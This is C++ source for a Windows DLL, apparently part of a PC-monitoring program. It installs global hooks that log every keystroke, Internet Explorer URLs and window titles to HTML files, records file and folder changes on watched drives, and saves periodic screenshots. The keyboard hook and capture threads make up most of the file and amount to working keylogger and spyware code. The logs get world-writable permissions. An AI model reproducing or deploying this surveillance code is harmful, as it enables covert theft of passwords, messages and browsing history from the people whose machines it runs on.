// WatcherDll.cpp : Defines the initialization routines for the DLL.
//

/*
			CWindowDC dc(desktop);
			POINT p;
			::GetCursorPos(&p);
			CString text;
			text.Format("x=%d,y=%d down",p.x,p.y);
			RECT r;
			SetRect(&r,0,0,200,100);
			dc.DrawText(text,&r,DT_CENTER);

			
	
	change+=_T(" "+KBPath;
			CWnd* desktop=CWnd::GetDesktopWindow();
  			CWindowDC dc(desktop);
			RECT r;
			SetRect(&r,200,300,800,400);
			dc.DrawText(change,&r,DT_CENTER);

*/

#include "stdafx.h"
#include <afxdllx.h>
#include <Shlwapi.h>
#include <mshtml.h>
#include <atlbase.h>
#include "afxmt.h"
#include <atlimage.h>
#include <memory.h> 
#include <Aclapi.h>

#define __EXPORTING__
#include "hooks.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//#define SHMEMSIZE 4096  
#define PATH_LEN 400 //400 w_chars for long paths and URLs
static LPVOID lpvMem = NULL; // pointer to shared memory

//we got a buffer with pointer to it, so we can use it as array starting from lpvMem
//we shall save several values to it, so each value will have an index and size for storage
//i reserved for BOOL 4bytes, and for each string 400 w_chars = 800 bytes

/////// set once by the first process, read once by every next process ///////
static int  isWTIndex=0; //4 bytes
static int isIEIndex=isWTIndex+4; //4 bytes for the BOOL values
static int KBPathIndex=isIEIndex+PATH_LEN*2; //*2 because we use WCHAR for strings
static int IEPathIndex=KBPathIndex+PATH_LEN*2;
static int FFPathIndex=IEPathIndex+PATH_LEN*2;
static int WTPathIndex=FFPathIndex+PATH_LEN*2;
static int SSPathIndex=WTPathIndex+PATH_LEN*2;
////////set many by any process, read many by any process /////
static int prevURLIndex=SSPathIndex+PATH_LEN*2;
static int prevWTIndex=prevURLIndex+PATH_LEN*2;
//the size of the shared memory becomes 
static int SHMEMSIZE=prevWTIndex+PATH_LEN*2;


HANDLE hMap = NULL;  // handle to file mapping 


static AFX_EXTENSION_MODULE WatcherDllDLL = { NULL, NULL };
bool windowChanged=false; //if the window with input focus changed, this will be cheked

HHOOK kbHook=NULL;
HHOOK MsgHook=NULL; //to watch IE Addresses, WindowTitles
bool isKB=false; //is KB WATCH STARTED
bool isIE=false;
bool isFileFolder=false;
bool isScreenShots=false;
bool isWT=false; //initializing this to false make things go wrong, i don't know why?

HINSTANCE instance; //DLL INSTANCE HANDLE
	
CString KBPath;
CString IEPath;
CString FFPath;
CString WTPath;
CString screenShootsFolder;

//report paths are the same as data path but with .htm appened

CString prevURL=_T("");
CString prevWT=_T("");

struct FileInfo{
	DWORD NextEntryOffset;
	DWORD Action;
	DWORD FileNameLength;
	TCHAR FileName[MAX_PATH];
};

struct CaptureInfo{
	bool activeWindow;
	float w; //width percent
	float h; //height percent
	int ellaped;
} captureInfo;

//this method is not called for the first process that loads this dll
void initProcess(){
	//read contents from shared memory into suitable variables
	int isWTCon=0;
	int isIECon=0; 
	WCHAR KBPathCon[PATH_LEN];
	WCHAR IEPathCon[PATH_LEN];
	WCHAR FFCon[PATH_LEN];
	WCHAR WTPathCon[PATH_LEN];
	WCHAR SSPathCon[PATH_LEN];
	WCHAR prevURLCon[PATH_LEN];
	WCHAR prevWTCon[PATH_LEN];

	memcpy(&isWTCon,(LPVOID)((INT_PTR)lpvMem+isWTIndex),4);
	memcpy(&isIECon,(LPVOID)((INT_PTR)lpvMem+isIEIndex),4);
	memcpy(KBPathCon,(LPVOID)((INT_PTR)lpvMem+KBPathIndex),PATH_LEN*2);
	memcpy(IEPathCon,(LPVOID)((INT_PTR)lpvMem+IEPathIndex),PATH_LEN*2);
	memcpy(FFCon,(LPVOID)((INT_PTR)lpvMem+FFPathIndex),PATH_LEN*2);
	memcpy(WTPathCon,(LPVOID)((INT_PTR)lpvMem+WTPathIndex),PATH_LEN*2);
	memcpy(SSPathCon,(LPVOID)((INT_PTR)lpvMem+SSPathIndex),PATH_LEN*2);
	memcpy(prevURLCon,(LPVOID)((INT_PTR)lpvMem+prevURLIndex),PATH_LEN*2);
	memcpy(prevWTCon,(LPVOID)((INT_PTR)lpvMem+prevWTIndex),PATH_LEN*2);

	//now copy values to the global araibles
	isWT=(BOOL)isWTCon;
	isIE=(BOOL)isIECon; 
	KBPath=KBPathCon;
	IEPath=IEPathCon;
	FFPath=FFCon;
	WTPath=WTPathCon;
	screenShootsFolder=SSPathCon;
	prevURL=prevURLCon;
	prevWT=prevWTCon;	

}

CString getPrevURL(){
	WCHAR prevURLCon[PATH_LEN];
	memcpy(prevURLCon,(LPVOID)((INT_PTR)lpvMem+prevURLIndex),PATH_LEN*2);
	prevURL=prevURLCon;

	return prevURL;
}

CString getPrevWT(){
	WCHAR prevWTCon[PATH_LEN];
	memcpy(prevWTCon,(LPVOID)((INT_PTR)lpvMem+prevWTIndex),PATH_LEN*2);
	prevWT=prevWTCon;

	return prevWT;
}

BOOL setPrevURL(CString& str){
	//we can set the memory to '\0' (safer but time) or copy the NULL termintor too
//	memset((LPVOID)((INT_PTR)lpvMem+prevURLIndex),'\0',PATH_LEN*2);
	int size=str.GetLength()*2+2; //2 for the NULL terminator
	if(size>PATH_LEN*2)
		size=PATH_LEN;
	memcpy((LPVOID)((INT_PTR)lpvMem+prevURLIndex),str.GetString(),size);
	return TRUE;
}

BOOL setPrevWT(CString& str){
	int size=str.GetLength()*2+2;
	if(size>PATH_LEN*2)
		size=PATH_LEN;
	memcpy((LPVOID)((INT_PTR)lpvMem+prevWTIndex),str.GetString(),size);
	return TRUE;
}


void draw(CString str){
			CWnd* desktop=CWnd::GetDesktopWindow();
  			CWindowDC dc(desktop);
			RECT r;
			SetRect(&r,0,0,800,400);
			dc.DrawText(str,&r,DT_CENTER);
}

//initilaize the File by creating it and specifying security attributes to full 
//access to all users (required for NTFS scurity model) 
void initFile(CString path){
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd,TRUE,NULL,FALSE);

	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=&sd;
	sa.bInheritHandle=FALSE;

	HANDLE h=CreateFile(path,GENERIC_WRITE,0,&sa,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
	if(h!=INVALID_HANDLE_VALUE)
		CloseHandle(h);
}


BOOL SaveStringToFile(CString path,CString str){ //add a web address to the WAFile
	CCriticalSection cs;
	cs.Lock();
	if(!PathFileExists(path))
		initFile(path); //to create and set security options correctly
	
	CStdioFile file;
	try{ //open in Binary mode in necessary to write Unicode Strings right
		if(file.Open(path,CFile::modeWrite|CFile::modeCreate|CFile::modeNoTruncate|CFile::typeBinary)){
			file.SeekToEnd();
			file.WriteString(str);
			file.Close();
		}	
	}
	catch(...){
		file.Close();
	}
	cs.Unlock();
	return TRUE;
}

extern "C" int APIENTRY
DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	// Remove this if you use lpReserved
	UNREFERENCED_PARAMETER(lpReserved);
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		TRACE0("WatcherDll.DLL Initializing!\r\n");
		instance=hInstance;

		//create a shared memory to save values common to all processes that load this  dll
		//each application that is hooked by any way load this dll to become part of it's
		//process virtual address space, even static members don't get saved acrross multiple
		//processes, first process creates it, others open it
        hMap= CreateFileMapping( 
               INVALID_HANDLE_VALUE, // use paging file
                NULL,                 // no security attributes
                PAGE_READWRITE,       // read/write access
                0,                    // size: high 32-bits
                SHMEMSIZE,            // size: low 32-bits
                _T("yasser_hooks_shared_memory_01"));     // name of map object
		//if values were not saved in shared memory KB,WT,WA watch won't work 
        if (hMap== NULL) 
            return FALSE; 
		BOOL firstProcess=(GetLastError() != ERROR_ALREADY_EXISTS);

	    // Get a pointer to the file-mapped shared memory.
        lpvMem = MapViewOfFile( 
            hMap,     // object to map view of
            FILE_MAP_WRITE, // read/write access
            0,              // high offset:  map from
            0,              // low offset:   beginning
        0);             // default: map entire file
        if (lpvMem == NULL)
            return FALSE; 
			
		if(firstProcess){ //first process initialize memory
			memset(lpvMem, '\0', SHMEMSIZE);
			memset((LPVOID)((INT_PTR)lpvMem+isWTIndex),0,4);
			memset((LPVOID)((INT_PTR)lpvMem+isIEIndex),0,4);
		}
		else{ //consequent processes initialize their local variables from shared memory
			initProcess(); //read variables
		}
		// Extension DLL one-time initialization
		if (!AfxInitExtensionModule(WatcherDllDLL, hInstance))
			return 0;

		// Insert this DLL into the resource chain
		// NOTE: If this Extension DLL is being implicitly linked to by
		//  an MFC Regular DLL (such as an ActiveX Control)
		//  instead of an MFC application, then you will want to
		//  remove this line from DllMain and put it in a separate
		//  function exported from this Extension DLL.  The Regular DLL
		//  that uses this Extension DLL should then explicitly call that
		//  function to initialize this Extension DLL.  Otherwise,
		//  the CDynLinkLibrary object will not be attached to the
		//  Regular DLL's resource chain, and serious problems will
		//  result.

		new CDynLinkLibrary(WatcherDllDLL);

	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		TRACE0("WatcherDll\.DLL Terminating!\r\n");

       // Unmap shared memory from the process's address space. 
       UnmapViewOfFile(lpvMem); 
        // Close the process's handle to the file-mapping object.
       CloseHandle(hMap); 
		// Terminate the library before destructors are called
		AfxTermExtensionModule(WatcherDllDLL);
	}
	return 1;   // ok
}



CString GetURL(HWND hWndChild){
	CoInitialize( NULL );	// Explicitly load MSAA so we know if it's installed
	CString url=_T("");
	HINSTANCE hInst = ::LoadLibrary( _T("OLEACC.DLL") );
	if ( hInst != NULL )
	{
		//	HWND hWndChild=NULL;
			// Get 1st document window
		//	::EnumChildWindows( hWnd, EnumChildProc, (LPARAM)&hWndChild );
			if ( hWndChild )
			{
				CComPtr<IHTMLDocument2> spDoc;
				LRESULT lRes;
			
				UINT nMsg = ::RegisterWindowMessage( _T("WM_HTML_GETOBJECT") );
				::SendMessageTimeout( hWndChild, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes );		
				LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress( hInst,"ObjectFromLresult");
				if ( pfObjectFromLresult != NULL )
				{
					HRESULT hr;
					hr = (*pfObjectFromLresult)( lRes, IID_IHTMLDocument, 0, (void**)&spDoc );
					if ( SUCCEEDED(hr) )
					{
						CComPtr<IDispatch> spDisp;
						CComQIPtr<IHTMLWindow2> spWin;
						spDoc->get_Script( &spDisp );
						spWin = spDisp;
						spWin->get_document( &spDoc.p );
						CComBSTR bstr;
						spDoc->get_URL(&bstr);
						url=COLE2T(bstr);
						url.Replace(_T("%20"),_T(" "));
					}
				}
			} // else document not ready
		::FreeLibrary( hInst );
	} // else Active Accessibility is not installed
	CoUninitialize();
	return url;
}

LRESULT CALLBACK KeyboardProc(int code/*hook code*/,WPARAM wParam/* virtual-key code*/,
  LPARAM lParam/*keystroke-message information*/){
	 
	  if(code<0) //don't touch
		  return CallNextHookEx(kbHook,code,wParam,lParam);
	    
	  if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==code)){
		  //last bit is one, key up ignore
		  switch(wParam){
			  case VK_BACK:
				SaveStringToFile(KBPath,_T(" [BACK_SCAP] "));
				  break;
			  case VK_RETURN:
				SaveStringToFile(KBPath,_T("\r\n<BR>"));
				break;
			  case VK_TAB:
				SaveStringToFile(KBPath,_T(" [TAB] "));
				break;
			  case VK_SPACE:
				  SaveStringToFile(KBPath,_T("&nbsp;"));
				  break;
			  case VK_SHIFT:
				  SaveStringToFile(KBPath,_T(" [SHIFT] ") );

				  break;
			  case VK_CONTROL :
				  SaveStringToFile(KBPath,_T(" [CTRL] ") );

				  break;
			  case VK_ESCAPE:
				  SaveStringToFile(KBPath,_T(" [ESC] ") );

				  break;
			  case VK_PRIOR: //page up
				  SaveStringToFile(KBPath,_T(" [PAGE_UP] "));

				  break;
			  case VK_NEXT: //page down
				  SaveStringToFile(KBPath,_T(" [PAGE_DOWN] ") );

				  break;
			  case VK_END:
				  SaveStringToFile(KBPath,_T(" [END] ") );

				  break;
			  case VK_HOME:
				  SaveStringToFile(KBPath,_T(" [HOME] ") );

				  break;
			  case VK_LEFT:
				  SaveStringToFile(KBPath,_T(" [LEFT] ") );

				  break;
			  case VK_UP:
				  SaveStringToFile(KBPath,_T(" [UP] "));

				  break;
			  case VK_RIGHT:
				  SaveStringToFile(KBPath,_T(" [RIGHT] ") );

				  break;
			  case VK_DOWN:
				  SaveStringToFile(KBPath,_T(" [DOWN] ") );

				  break;
			  case VK_INSERT:
				  SaveStringToFile(KBPath,_T(" [INSERT] ") );

				  break;
			  case VK_DELETE:
				  SaveStringToFile(KBPath,_T(" [DELETE] ") );

				  break;
			  case VK_LWIN:
				  SaveStringToFile(KBPath,_T(" [LEFT_WIN] ") );

				  break;
			  case VK_RWIN:
				  SaveStringToFile(KBPath,_T(" [RIGHT_WIN] ") );

				  break;
			  case VK_MULTIPLY:
				  SaveStringToFile(KBPath,_T("*"));

				  break;
			  case VK_ADD:
				  SaveStringToFile(KBPath,_T("+"));

				  break;
			  case VK_SEPARATOR:
				  SaveStringToFile(KBPath,_T("_"));

				  break;
			  case VK_SUBTRACT:
				  SaveStringToFile(KBPath,_T("-"));
				  break;
			  case VK_DECIMAL:
				  SaveStringToFile(KBPath,_T("."));

				  break;
			  case VK_DIVIDE:
				  SaveStringToFile(KBPath,_T("/"));

				  break;
			  case VK_MENU:
				  SaveStringToFile(KBPath,_T(" [ALT] "));	
				  break;
				default:
					CWnd* focus=CWnd::GetActiveWindow(); //this code is not neccessary
					if(focus==NULL)
						return CallNextHookEx(kbHook,code,wParam,lParam);
					int size=sizeof(focus->m_hWnd);
					CString str;
					focus->GetWindowText(str);
					//load the prevWT from shared memory, other processes might changed already
					prevWT=getPrevWT();
					if(str!=prevWT){ //window title chaged
						setPrevWT(str); //WT update for all processes
						CTime time=CTime::GetCurrentTime();
						CString date;
						date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] ") );

						CString htm=_T("<HR>\r\n<FONT color=\"#ccffff\"><STRONG><h4>")+date+_T("Window title:")+str+_T("</h3></STRONG></FONT>\r\n");
						SaveStringToFile(KBPath,htm);
					}
			
   					BYTE ks[256];
					GetKeyboardState(ks);
				//	WORD w;
					UINT scan;
					scan=0;
				//	ToAscii(wParam,scan,ks,&w,0); for nonUnicode
					TCHAR c;
					int r=ToUnicode(wParam,scan,ks,&c,1/* NUMBER OF CHARS */,0);
					CString chr;
					chr.AppendChar(c);
					SaveStringToFile(KBPath,chr);
			
		  }
		  
	  }

	  
	  return CallNextHookEx(kbHook,code,wParam,lParam); //return -1 will block the keyboard
  }


  /* for unklnow reason i don't know why the value of global varibales are restored to 
  thier orginal value wen leaving the program window, this is why i separete the hook into
  two */

  LRESULT CALLBACK MsgProc(int code,// hook code
  WPARAM wParam,  //removal option
  LPARAM lParam   //pointer to MSG struct
  ){
	  //we'll make use of WM_PAINT messages for applications to tell if Window Title has
	  //changed or if InternetExplorer Server window is embeded
	  if(code>=0){ // ||HSHELL_REDRAW 
	    PMSG msg=(PMSG)lParam;
		if(msg->message!=WM_PAINT)
			 return CallNextHookEx(MsgHook,code,wParam,lParam);
		CTime time=CTime::GetCurrentTime();
		CString date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] ") );
		
		//one of those two ifs at least will be entered
		  if(isIE){

			TCHAR	buf[100];
			::GetClassName( msg->hwnd, (LPTSTR)&buf, 100 );
			if ( _tcscmp( buf, _T("Internet Explorer_Server") ) == 0 )
			{
				//retirive the WebAddress.
				CString url=GetURL(msg->hwnd);
				//get prevURL from shared mem
				prevURL=getPrevURL();
				if(url.Compare(prevURL)!=0){ //new URL
					SaveStringToFile(IEPath,date+_T("<a href=\"")+url+_T("\">")+url+_T("</a><br>\r\n"));
					prevURL=url;
					setPrevURL(url);
				}
			}
		  }

		  if(isWT){
			
			//if Window Title service is wanted then check Window Title Change here		
			CWnd* focus=CWnd::GetActiveWindow(); //this code is not neccessary
			if(focus==NULL)
				return CallNextHookEx(MsgHook,code,wParam,lParam);
			CString title;
			focus->GetWindowText(title);
			prevWT=getPrevWT();
			
			if(title!=prevWT){
				CString temp=_T("<BR>\r\n<FONT color=\"#ccffff\"><STRONG><h3>")+date+title+_T("</h3></STRONG></FONT>");
				SaveStringToFile(WTPath,temp);
				setPrevWT(title); //updated for all processes 
			}
		  }
	  }

	return CallNextHookEx(MsgHook,code,wParam,lParam);
  }

  /* the one thread approach for each directory notification is more clear and gives
     more consistent notification, though, it's not the best solution when the user 
	 chooses to watch many directory trees (like 10 drives)
	 on the other hand one thread for all trees and using asynchronous ReadDirectoryChanges
	 works better in that case 
	 for now i took the first choice*/
  UINT FileFolderChangesThread(LPVOID param){

	  WCHAR* str=(WCHAR*)param;
	  CString DirName;
	  DirName=str;
	  TRACE(DirName+_T("\r\n"));
	  
	  HANDLE hFile= CreateFile(
				DirName,                            // pointer to the file name
				FILE_LIST_DIRECTORY,                // access (read/write) mode
				FILE_SHARE_READ|FILE_SHARE_DELETE|FILE_SHARE_WRITE,  // share mode
				NULL,                               // security descriptor
				OPEN_EXISTING,                      // how to create
				FILE_FLAG_BACKUP_SEMANTICS,         // file attributes
				NULL                                // file with attributes to copy
				);                    // no attr. template 
	 
	if (hFile == INVALID_HANDLE_VALUE) 
	{ 
			return -1; 
	} 
	DWORD options=FILE_NOTIFY_CHANGE_FILE_NAME/* rename, create, delete*/|FILE_NOTIFY_CHANGE_DIR_NAME;
//		|FILE_NOTIFY_CHANGE_ATTRIBUTES|FILE_NOTIFY_CHANGE_SIZE|FILE_NOTIFY_CHANGE_CREATION
//		|FILE_NOTIFY_CHANGE_SECURITY|FILE_NOTIFY_CHANGE_LAST_WRITE;

	DWORD buflen=0;
	int index=DirName.Find(_T("\\"),DirName.GetLength()-1);
	if(index>0)
		DirName.Delete(index); //for paths that end with slash 
	while(isFileFolder){
		FileInfo fileInfo;
		BOOL result=ReadDirectoryChangesW(hFile,&fileInfo,sizeof(fileInfo),TRUE,options,&buflen,NULL,NULL);
		if(result){
			//because \0 character doesn't end the FileName property we'll copy
			// the required chars 
			CString fileName;
			fileName.Append(fileInfo.FileName,fileInfo.FileNameLength/sizeof(TCHAR));
			CString action;
			switch(fileInfo.Action){
				case FILE_ACTION_ADDED:
					action=_T(" added: ");
					break;
				case FILE_ACTION_REMOVED :
					action=_T(" removed: ");
					break;
				case FILE_ACTION_RENAMED_NEW_NAME: 
					action=_T(" is the new name:");
					break;
				case FILE_ACTION_RENAMED_OLD_NAME:
					action=_T(" renamed: ");
					break;
				default:
					action=_T("modiefied at: ");
			}
			CTime time=CTime::GetCurrentTime();
			CString date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] " ));
			CString temp=_T("<BR>")+date+action+_T(" ")+DirName+_T("\\")+fileName+_T("\r\n");
			SaveStringToFile(FFPath,temp);
		}
	}
	return 0;
  }

  UINT captureThread(LPVOID param){

	while(isScreenShots){

		CWnd* window=NULL;
		CImage image;
		RECT clipRect;

		if(captureInfo.activeWindow)
			window=CWnd::GetForegroundWindow();
		else
			window=CWnd::GetDesktopWindow();

		if(!window)
			continue;
	
	    window->GetWindowRect(&clipRect);
		CWindowDC winDC(window);
		
		//check the device capabbilities: if number of bits per pixel less then
		//24 then rise it to 24
		int bitsPerPixel=winDC.GetDeviceCaps(BITSPIXEL)*winDC.GetDeviceCaps(PLANES);
		if(bitsPerPixel<24)
			bitsPerPixel=24;
		int width=clipRect.right-clipRect.left;
		int height=clipRect.bottom-clipRect.top;
		
		//get an imageDC and copy the regin from the window dc to the image dc
		
		BOOL created=FALSE;
		if((captureInfo.h<=0) || (captureInfo.w<=0) ||(captureInfo.h>=1) || (captureInfo.w>=1)){
			created=image.Create(width,height,bitsPerPixel);
			if(!created)
				continue;
			CImageDC imageDC(image);
			BitBlt(imageDC,0,0,width,height,winDC,0,0,SRCCOPY);
		}
		else{
			int destWidth=(int)width*captureInfo.w;
			int destHeight=(int)height*captureInfo.h;
			created=image.Create(destWidth,destHeight,bitsPerPixel);
			if(!created)
				continue;
			CImageDC imageDC(image);
			StretchBlt(imageDC,0,0,destWidth,destHeight,winDC,0,0,width,height,SRCCOPY);
		}

		CTime time=CTime::GetCurrentTime();
		CString date=time.Format(_T("%d_%m_%y_%H_%M_%S"));
		CString filePath=screenShootsFolder+_T("\\")+date+_T(".jpg");
		image.Save(filePath);
		/* set the security attributes for the created file to full access for 
		all users, so if an admin installed the program, limited accounts will have
		the power to delete the files and clearing data*/
		SECURITY_DESCRIPTOR sd;
		InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
		SetSecurityDescriptorDacl(&sd,TRUE,NULL,FALSE);	
		SetFileSecurity(filePath,DACL_SECURITY_INFORMATION,&sd);

		Sleep(captureInfo.ellaped);
	}
	return 0;
  }

  /////////////////////////////start services

  BOOL startKB(void)
  {	
	  if(isKB)
		  return TRUE;

	 kbHook=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,instance,0); //0 watch all threads
	 if(kbHook==NULL)
		return FALSE;

	  isKB=true;
	  return TRUE;
  }

  BOOL startIEAddress(void)
  {
	  if(isIE)
		  return TRUE;
	  if(!isWT) //already set by WT
	  	  MsgHook=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)MsgProc,instance,0); //0 watch all threads	  
 	  if(MsgHook==NULL)
		  return FALSE; 
	  isIE=true;
	  memcpy((LPVOID)((INT_PTR)lpvMem+isIEIndex),&isIE,sizeof(isIE));
	  return TRUE;
  }

    BOOL startFileFolder(CString paths[],int pathsNum/*number of paths*/)
  {
	  if(isFileFolder)
		  return TRUE;

	  isFileFolder=true;
	  for(int i=0;i<pathsNum;i++)
		AfxBeginThread(FileFolderChangesThread,paths[i].GetBuffer());

	Sleep(2000); //sleep for two seconds so that local variables are not lost in threads
	//before they got copied inside
	  return TRUE;
  }

    BOOL __OPERATION__ startWindowTitle(void)
  {
	  if(isWT)
		  return TRUE;
	  if(!isIE)
		  MsgHook=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)MsgProc,instance,0); //0 watch all threads
	
	  if(MsgHook==NULL)
		  return FALSE;
	  isWT=true;
	  memcpy((LPVOID)((INT_PTR)lpvMem+isWTIndex),&isWT,sizeof(isWT));
	  return TRUE;
  }

    BOOL startScreenShoots(bool activeWindow/*or full screen*/,float w,float h,int time)
  {
	if(isScreenShots) //already set
		return TRUE;
	isScreenShots=true;
	captureInfo.activeWindow=activeWindow;
	captureInfo.w=w;
	captureInfo.h=h;
	captureInfo.ellaped=time;
	AfxBeginThread(captureThread,NULL);
	return 0;
  }


  
  //////////////////////////////stop services
  BOOL __OPERATION__  stopKB(void)
  {
	  if(isKB){
		  UnhookWindowsHookEx(kbHook);
		  isKB=false;
	  }

	  return TRUE;
  }

  BOOL __OPERATION__  stopIEAddress(void)
  {
  	  if(isIE && (!isWT)) //keep the hook incase the isWT is true
		  UnhookWindowsHookEx(MsgHook);

	  isIE=false;
	  return 0;
  }

    BOOL __OPERATION__  stopFileFolder(void)
  {
	  isFileFolder=false;
	  return 0;
  }

    BOOL __OPERATION__  stopWindowTitle(void)
  {
	  if(isWT && (!isIE))
		  UnhookWindowsHookEx(MsgHook); //hook remains alive if isIE is true
	  isWT=false;
	  return TRUE;
  }

    BOOL __OPERATION__  stopScreenShoots(void)
  {
	  isScreenShots=false;
	  return 0;
  }
 
  //we'll use the return value to check that only one instance of the program is runing 
  bool  __OPERATION__ setPaths(CString kb, CString ie, CString ff, CString wt, CString ss)
  {
	  initProcess();
	  if(KBPath!=_T("\0"))
		  return false; //means a prior program instance process set the shared memory

	KBPath=kb;
	IEPath=ie;
	FFPath=ff;
	WTPath=wt;
	screenShootsFolder=ss;

	memcpy((LPVOID)((INT_PTR)lpvMem+KBPathIndex),KBPath.GetString(),KBPath.GetLength()*2+2);
	memcpy((LPVOID)((INT_PTR)lpvMem+IEPathIndex),IEPath.GetString(),IEPath.GetLength()*2+2);
	memcpy((LPVOID)((INT_PTR)lpvMem+FFPathIndex),FFPath.GetString(),FFPath.GetLength()*2+2);
	memcpy((LPVOID)((INT_PTR)lpvMem+WTPathIndex),WTPath.GetString(),WTPath.GetLength()*2+2);
	memcpy((LPVOID)((INT_PTR)lpvMem+SSPathIndex),screenShootsFolder.GetString(),screenShootsFolder.GetLength()*2+2);

	return true;
  }
